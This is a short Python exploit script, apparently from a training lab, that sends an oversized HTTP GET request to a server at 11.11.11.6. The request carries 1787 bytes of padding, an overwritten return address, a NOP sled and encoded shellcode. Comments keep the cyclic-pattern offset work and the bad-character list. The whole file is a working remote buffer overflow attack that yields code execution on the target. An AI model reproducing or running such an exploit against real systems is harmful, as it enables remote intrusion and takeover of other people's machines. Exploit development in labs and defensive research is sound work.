#!/usr/share/python
import socket,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('11.11.11.6',80))
buff="GET "
#\x0b   \x0d \x00
#[*] Exact match at offset 1787
#buff+="A"*2000
#buff="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
#ret0x7e429353
#ret = 

shellcode = ("\xda\xd9\xd9\x74\x24\xf4\x5e\xbf\x71\x7c\x0e\x9c\x29\xc9\xb1"
"\x53\x31\x7e\x17\x83\xee\xfc\x03\x0f\x6f\xec\x69\x13\x67\x72"
"\x91\xeb\x78\x13\x1b\x0e\x49\x13\x7f\x5b\xfa\xa3\x0b\x09\xf7"
"\x48\x59\xb9\x8c\x3d\x76\xce\x25\x8b\xa0\xe1\xb6\xa0\x91\x60"
"\x35\xbb\xc5\x42\x04\x74\x18\x83\x41\x69\xd1\xd1\x1a\xe5\x44"
"\xc5\x2f\xb3\x54\x6e\x63\x55\xdd\x93\x34\x54\xcc\x02\x4e\x0f"
"\xce\xa5\x83\x3b\x47\xbd\xc0\x06\x11\x36\x32\xfc\xa0\x9e\x0a"
"\xfd\x0f\xdf\xa2\x0c\x51\x18\x04\xef\x24\x50\x76\x92\x3e\xa7"
"\x04\x48\xca\x33\xae\x1b\x6c\x9f\x4e\xcf\xeb\x54\x5c\xa4\x78"
"\x32\x41\x3b\xac\x49\x7d\xb0\x53\x9d\xf7\x82\x77\x39\x53\x50"
"\x19\x18\x39\x37\x26\x7a\xe2\xe8\x82\xf1\x0f\xfc\xbe\x58\x58"
"\x31\xf3\x62\x98\x5d\x84\x11\xaa\xc2\x3e\xbd\x86\x8b\x98\x3a"
"\xe8\xa1\x5d\xd4\x17\x4a\x9e\xfd\xd3\x1e\xce\x95\xf2\x1e\x85"
"\x65\xfa\xca\x30\x6d\x5d\xa5\x26\x90\x1d\x15\xe7\x3a\xf6\x7f"
"\xe8\x65\xe6\x7f\x22\x0e\x8f\x7d\xcd\x21\x0c\x0b\x2b\x2b\xbc"
"\x5d\xe3\xc3\x7e\xba\x3c\x74\x80\xe8\x14\x12\xc9\xfa\xa3\x1d"
"\xca\x28\x84\x89\x41\x3f\x10\xa8\x55\x6a\x30\xbd\xc2\xe0\xd1"
"\x8c\x73\xf4\xfb\x66\x17\x67\x60\x76\x5e\x94\x3f\x21\x37\x6a"
"\x36\xa7\xa5\xd5\xe0\xd5\x37\x83\xcb\x5d\xec\x70\xd5\x5c\x61"
"\xcc\xf1\x4e\xbf\xcd\xbd\x3a\x6f\x98\x6b\x94\xc9\x72\xda\x4e"
"\x80\x29\xb4\x06\x55\x02\x07\x50\x5a\x4f\xf1\xbc\xeb\x26\x44"
"\xc3\xc4\xae\x40\xbc\x38\x4f\xae\x17\xf9\x7f\xe5\x35\xa8\x17"
"\xa0\xac\xe8\x75\x53\x1b\x2e\x80\xd0\xa9\xcf\x77\xc8\xd8\xca"
"\x3c\x4e\x31\xa7\x2d\x3b\x35\x14\x4d\x6e")

buff += "A" * 1787 + "\x53\x93\x42\x7e" + "\x90" * 20 + shellcode

buff+=" HTTP/1.1\r\n\r\n"
s.send(buff)
s.close()

